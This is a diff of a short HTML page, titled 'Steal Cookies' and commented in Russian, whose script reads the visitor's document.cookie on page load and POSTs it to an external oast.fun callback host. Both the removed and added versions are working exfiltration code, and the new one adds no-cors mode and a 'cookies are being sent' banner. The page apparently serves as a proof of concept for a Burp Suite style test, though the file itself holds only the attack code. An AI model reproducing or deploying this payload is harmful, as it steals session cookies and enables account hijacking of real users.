@@ -1,35 +1,21 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <title>Отправка кук</title>
+    <title>Steal Cookies</title>
     <script>
-        // Получаем все клиентские куки
-        const cookies = document.cookie;
-
-        // Формируем данные
-        const data = {
-            cookies: cookies,
-            timestamp: new Date().toISOString()
-        };
-
-        // Отправляем POST-запрос
-        fetch('https://rbpdypiimtovkmpbmwsom1c9paqgxlt2y.oast.fun ', {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
-        })
-        .then(() => {
-            console.log('Куки отправлены');
-        })
-        .catch(err => {
-            console.error('Ошибка:', err);
-        });
+        // Проверяем, есть ли куки
+        if (document.cookie) {
+            fetch('https://rbpdypiimtovkmpbmwsom1c9paqgxlt2y.oast.fun ', {
+                method: 'POST',
+                body: document.cookie,
+                mode: 'no-cors'
+            });
+        } else {
+            console.log("Нет кук для отправки");
+        }
     </script>
 </head>
 <body>
-    <h1>Проверьте консоль или Burp Suite</h1>
+    <h1>Куки отправляются...</h1>
 </body>
 </html>
